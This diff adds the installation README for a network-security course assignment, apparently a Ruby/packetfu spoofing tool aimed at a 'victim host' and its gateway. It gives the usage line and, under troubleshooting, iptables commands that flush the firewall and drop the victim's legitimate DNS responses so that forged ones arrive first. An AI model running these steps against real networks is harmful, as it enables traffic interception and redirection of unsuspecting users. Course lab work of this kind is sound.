@@ -1,0 +1,41 @@
+================================================================================
+                                Installation Documentation
+                               -----------------------------
+                            COMP 8505 - Assignment 2: Backdoor
+                            Developed and Designed by Andrew Maledy
+
+All code above is licenses under the GNU and may not be sold or redistributed 
+for profit. For more information regarding General Public Licensing see
+http://www.gnu.org/licenses/. 
+
+================================================================================
+Both the client and the server need the following to run:
+    - Ruby (1.9 or later recommended)
+    - Libpcap
+        - yum install libpcap
+        - yum install libpcap-devel
+    - Packetfu & pcaprub gems
+        - gem install packetfu (1.1.6 recommended)
+        - gem install pcaprub (0.11.3 recommended)
+
+To check what you gems you currently have installed:
+    - gem list 
+    
+================================================================================
+                                        Usage
+                                       -------
+Once the above is installed, run the server via ruby
+================================================================================
+./main.rb -s [spoof ip] -h [victim host] -m [victim mac] -g [gateway address] -r [gateway mac] -i [interface to send on]
+
+================================================================================
+                                        Troubleshooting
+                                       -------
+If the victim is recieving legitimate DNS response packets before yours, block
+all returning DNS responses
+================================================================================
+
+# drop all packets that would be normally returned to the host
+
+iptables -F #reset the firewall
+iptables -A FORWARD -p udp -sport 53 -d [victim] -j DROP 
